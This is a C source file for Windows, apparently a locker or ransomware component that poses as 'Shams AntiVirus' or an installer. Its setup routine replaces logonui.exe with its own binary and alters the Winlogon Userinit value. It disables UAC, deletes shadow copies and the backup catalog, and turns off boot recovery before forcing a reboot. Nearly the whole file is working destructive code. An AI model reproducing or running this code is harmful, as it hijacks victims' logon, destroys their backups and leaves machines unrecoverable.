#include "headers/setup.h"
#include "headers/tools.h"
#include <winuser.h>



typedef NTSTATUS(WINAPI *PNtShutdownSystem)(ULONG);

static BOOL give_shutdown_permissions(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
        return FALSE;
    }
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, (PLUID)&tkp.Privileges);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)){
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

void restart_system(){
    if(!give_shutdown_permissions()){
        MessageBoxW(NULL, L"Failed Shutting Down System\n", L"Installer", MB_OK | MB_ICONERROR);
        return;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PNtShutdownSystem NtShutdown = (PNtShutdownSystem)GetProcAddress(ntdll, "NtShutdownSystem");
    NtShutdown(1);
    FreeLibrary(ntdll);
    //ExitWindows(EWX_REBOOT, 0);
}


// void *memset(void *ptr, int value, size_t num) {
//     unsigned char *p = ptr;
//     for (size_t i = 0; i < num; ++i) {
//         *p++ = (unsigned char)value;
//     }
//     return ptr;
// }

void setup_enviroment(){
    //WinExec("taskkill /f /im explorer.exe", SW_HIDE);
    LPSTR path = (LPSTR)alloc_mem(5097);
    GetModuleFileNameA(NULL, path, 5096);
    WinExec("cmd /k takeown /f c:\\windows\\system32\\logonui.exe", SW_HIDE);
    char username[4096 + 1];
    DWORD usernameLen = 4096 + 1;
    GetUserNameA(username, &usernameLen);
    Sleep(3000);
    char cmd[512] = "cmd /k icacls c:\\windows\\system32\\logonui.exe /grant ";
    str_cat(cmd, username);
    str_cat(cmd, ":F /T /C");
    WinExec(cmd, SW_HIDE);
    Sleep(5000);
    WinExec("cmd /k del c:\\windows\\system32\\logonui.exe /f /q", SW_HIDE);
    Sleep(5000);
    CopyFile(path, "C:\\Windows\\System32\\logonui.exe", FALSE);
    free_mem(path);

    HANDLE file = CreateFileW(L"C:\\Windows\\system32\\APHostClient.ss", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(file == INVALID_HANDLE_VALUE){
        MessageBoxW(NULL, L"Failed Creating Setup Enviroment (0)", L"Shams AntiVirus", MB_OK | MB_ICONERROR);
        ExitProcess(0);
    }
    CloseHandle(file);

    WinExec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"notepad.exe\" /f", SW_HIDE);
    WinExec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", SW_HIDE);
    // Game Flickers Too mUCH IN Safe Mode
    //WinExec("bcdedit /set {current} safeboot minimal", SW_HIDE);
    WinExec("cmd /c vssadmin delete shadow /all /quiet", SW_HIDE);
    WinExec("wmic shadowcopy delete", SW_HIDE);
    WinExec("bcdedit /set {default} bootstatuspolicy ignoreallfailures", SW_HIDE);
    WinExec("bcdedit /set {default} recoveryenabled no", SW_HIDE);
    WinExec("wbadmin delete catalog -quiet", SW_HIDE);

    Sleep(10000);
    restart_system();
}